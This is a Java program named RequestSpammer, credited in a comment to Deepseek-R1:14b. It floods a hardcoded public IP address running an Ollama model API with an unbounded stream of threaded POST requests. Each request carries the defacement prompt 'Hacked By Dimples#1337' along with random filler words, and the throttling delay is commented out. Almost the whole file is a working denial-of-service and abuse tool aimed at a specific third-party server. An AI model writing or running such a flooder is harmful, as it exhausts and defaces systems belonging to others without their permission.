// Thanks: Deepseek-R1:14b
package net.deepseek;
import cn.a114.utils.SoutUtils;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;

public class RequestSpammer {
    private static final String BASE_URL = "http://183.6.26.100:11434/api/generate"; // Replace with your Ollama API endpoint
    private static final long NUM_REQUESTS = Long.MAX_VALUE; // Number of requests to send
    private static final String MODEL_NAME = "ChangeMe";

    public static void main(String[] args) {
        System.out.println("RequestSpammer is running");
        try {
            for (int i = 0; i < NUM_REQUESTS; i++) {
                String prompt = "Hacked By Dimples#1337"; // Replace with your prompt
                String imageName = randomWords(new Random().nextInt(45),false);
                boolean isUnsafe = true;
                synchronized (""){
                    SoutUtils.out("Try to Spam");
                    try {
                        new Thread(()->{
                            try{
                                synchronized (""){
                                    sendRequest(prompt, imageName, isUnsafe);
                                }
                            }catch (OutOfMemoryError e){
                                System.gc();
                            }


                        }).start();
                    } catch (OutOfMemoryError e) {
                        System.gc();
                    }
                }

            }
            // Use a thread pool to execute the requests concurrently

        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }

    public static String randomWords(int WordCount, boolean shouldSpace) throws IOException {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(RequestSpammer.class.getResourceAsStream("/words.txt")));

        String s;
        String words = "";
        synchronized (""){
            for (int i =0; i <=WordCount;i++){
                s = read(new Random().nextInt(466550));
                words += (s+(shouldSpace?" ":""));

            }
        }
        return words;

    }

    public static String read(int line) throws IOException {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(RequestSpammer.class.getResourceAsStream("/words.txt")));

        String s;
        String words = "";
        synchronized (""){
            for (int i =0; i <=line;i++){
                bufferedReader.readLine();
            }
        }
        words = bufferedReader.readLine();
        return words;
    }

    private static synchronized void sendRequest(String prompt, String imageName, boolean isUnsafe) {
        try {
            // Create the request body
            StringBuilder json = new StringBuilder();
            json.append("{");
            json.append("\"model\": \""+MODEL_NAME+"\",");
            json.append("\"prompt\": \"" + prompt + "\",");
            json.append("\"name\": \"" + imageName + "\",");
            json.append("\"is_unsafe\": " + isUnsafe);
            json.append("}");

            URL url = new URL(BASE_URL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();

            // Set headers
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);

            // Write the request body
            OutputStream os = connection.getOutputStream();
            os.write(json.toString().getBytes());
            os.flush();

            // Get response
            int statusCode = connection.getResponseCode();
            System.out.println("Status Code: " + statusCode);
//            synchronized (RequestSpammer.BASE_URL){
//                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
//                String is;
//                while ((is = br.readLine())!=null){
//                    System.out.println(is);
//                }
//            }
//            System.out.println("Response: " + (connection.getInputStream()));

            // Thread.sleep(1000L);
            // Add a small delay to prevent overwhelming the server
        } catch (Exception e) {
            System.out.println("Error sending request: " + e.getMessage());
        }
    }
}
